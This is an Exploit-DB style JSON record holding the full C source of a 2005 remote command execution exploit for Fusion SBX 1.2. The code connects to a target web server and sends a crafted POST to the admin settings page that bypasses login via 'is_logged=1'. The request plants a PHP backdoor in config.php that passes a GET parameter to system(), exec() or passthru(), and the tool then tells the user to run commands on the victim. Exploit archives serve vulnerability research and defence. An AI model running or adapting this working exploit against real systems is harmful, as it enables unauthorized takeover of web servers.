{
  "id": "1003",
  "title": "Fusion SBX 1.2 - Remote Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "/*****************************************************\r\n*                                                    *\r\n*  [Fusion SBX <= 1.2] exploit                       *\r\n*                                                    *\r\n*  sileFSBXxpl                                       *\r\n*                                                    *\r\n*  This exploit use vulnerability found into         *\r\n*  Fusion SBX and create new variable and call it    *\r\n*  with a malicious function (stored in config.php). *\r\n*  This exploit utilize injection of three diverse   *\r\n*  procedures for execution of arbitrary code on     *\r\n*  vulnerable machine with httpd privileges.         *\r\n*                                                    *\r\n*  References: www.securityfocus.org/bid/13575       * \r\n*                                                    *\r\n*  coded by: Silentium of Anacron Group Italy        *\r\n*      date: 10/05/2005                              *\r\n*    e-mail: anacrongroupitaly[at]autistici[dot]org  *\r\n*   my_home: www.autistici.org/anacron-group-italy   *\r\n*                                                    *\r\n*  this tool is developed under GPL license          *\r\n*  no(c) .:. copyleft                                *\r\n*                                                    *\r\n*****************************************************/\r\n\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\n#define PORT 80\t\t// port of web server \r\n\r\nvoid info(void);\r\nvoid banner(void);\r\nvoid sendxpl(FILE *out, char *argv[], int type);\r\nvoid errsock(void);\r\nvoid errgeth(void);\r\nvoid errconn(char *argv[]);\r\n\r\n\r\nint main(int argc, char *argv[]){\r\n\r\nFILE *out;\r\nint sock, sockconn, type;\r\nstruct sockaddr_in addr;\r\nstruct hostent *hp;\r\n\r\nif(argc!=4)\r\n   info();\r\n\r\ntype = atoi(argv[3]);\r\n\r\nif(type < 1 || type > 3)\r\n   info();\r\n\r\nbanner();\r\n   \r\nif((sock = socket(AF_INET,SOCK_STREAM,0)) < 0)\r\n   errsock();\r\n   \r\n   printf(\"[*] Creating socket\t\t[OK]\\n\");\r\n\r\nif((hp = gethostbyname(argv[1])) == NULL)\r\n   errgeth();\r\n   \r\n   printf(\"[*] Resolving victim host\t[OK]\\n\");\r\n   \r\nmemset(&addr,0,sizeof(addr));\r\nmemcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);\r\naddr.sin_family = AF_INET;\r\naddr.sin_port = htons(PORT);\r\n   \r\nsockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));\r\nif(sockconn < 0)\r\n   errconn(argv);\r\n   \r\n   printf(\"[*] Connecting at victim host   [OK]\\n\");\r\n   \r\nout = fdopen(sock,\"a\");\r\nsetbuf(out,NULL);\r\n\r\nsendxpl(out,argv,type);\r\n\r\n   printf(\"[*] Now test at execute code on\\n\\n\" \r\n          \"[1] %s%sindex.php?sile=id\\n\"\r\n          \"[2] %s%sadmin/index.php?sile=id\\n\\n\",argv[1],argv[2],argv[1],argv[2]);\r\n\r\nshutdown(sock,2);\r\nclose(sock);\r\n\r\nreturn 0;\r\n\r\n}\r\n\r\n\r\nvoid info(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"\\n   #########################################\\n\"\r\n       \"   #             sileFSBXxpl               #\\n\"\r\n       \"   #  ###################################  #\\n\"\r\n       \"   #       Fusion SBX <= 1.2 exploit       #\\n\"\r\n       \"   #       Remote Command Execution        #\\n\"\r\n       \"   #          coded by Silentium           #\\n\"            \r\n       \"   #        [ Anacron Group Italy ]        #\\n\"\r\n       \"   #  ###################################  #\\n\"\r\n       \"   # www.autistici.org/anacron-group-italy #\\n\"\r\n       \"   #########################################\\n\\n\"\r\n       \" [Usage]\\n\\n\" \r\n       \"  sileFSBXxpl <victim> <path_sbx> <type>\\n\\n\"\r\n       \"        [Type]\\n\\n\"\r\n       \"              1) injection of system()\\n\"\r\n       \"              2) injection of exec()\\n\"\r\n       \"              3) injection of passthru()\\n\\n\"\r\n       \" [Example]\\n\\n\"\r\n       \"  sileFSBXxpl www.victim.com /sbx/ 1\\n\\n\"); \r\nexit(1);\r\n\r\n}\r\n\r\n\r\nvoid banner(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"[-] sileFSBXxpl\\n\"\r\n       \"    ============\\n\"\r\n       \"[-] Fusion SBX <= 1.2 exploit\\n\"\r\n       \"[-] coded by Silentium - Anacron Group Italy\\n\"\r\n       \"[-] www.autistici.org/anacron-group-italy\\n\\n\");\r\n       \r\n}\r\n       \r\n\r\nvoid sendxpl(FILE *out, char *argv[], int type){\r\n\r\nchar *call;\r\nint size = 245;\r\n\r\nif(type == 1)\r\n   call = \"system\";\r\nelse if(type == 2)\r\n   call = \"exec\";\r\nelse if(type == 3)\r\n   call = \"passthru\";\r\n\r\nsize+=strlen(call);\r\n       \r\nfprintf(out,\"POST %sadmin/?settings HTTP/1.0\\n\"\r\n            \"Connection: Keep-Alive\\n\"\r\n            \"Pragma: no-cache\\n\"\r\n            \"Cache-control: no-cache\\n\"\r\n            \"Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\\n\"\r\n            \"Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\\n\"\r\n            \"Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\\n\"\r\n            \"Accept-Language: en\\n\"\r\n            \"Host: %s\\n\"\r\n            \"Content-Type: application/x-www-form-urlencoded\\n\"\r\n            \"Content-Length: %d\\n\\n\"\r\n            \"set2=basic&admin_set2=standard&lang2=english&plimit2=10&noname2=Guest&\"\r\n            \"refresh2=120&maxname2=30%%3B%%40%s%%28%%24_GET%%5Bsile%%5D%%29&maxmess\"\r\n            \"2=120&maxlink2=120&wordbanning2=1&maxword2=20&wrapstat2=1&postorder2=1\"\r\n            \"&setsubmit=Commit+Changes&is_logged=1\\n\\n\",argv[2],argv[1],size,call);\r\n                                  \r\n            printf(\"[*] Sending exploit\t\t[OK]\\n\\n\");\r\n\r\n}\r\n            \r\n                 \r\nvoid errsock(void){\r\n\r\nsystem(\"clear\");\r\nprintf(\"[x] Creating socket\t[FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\n\r\nvoid errgeth(void){\r\n\r\nprintf(\"[x] Resolving victim host\t[FAILED]\\n\\n\");\r\nexit(1);\r\n\r\n}\r\n\r\n\r\nvoid errconn(char *argv[]){\r\n\r\nprintf(\"[x] Connecting at victim host\t[FAILED]\\n\\n\",argv[1]);\r\nexit(1);\r\n\r\n}\r\n\r\n// milw0rm.com [2005-05-20]",
  "url": "https://www.exploit-db.com/exploits/1003"
}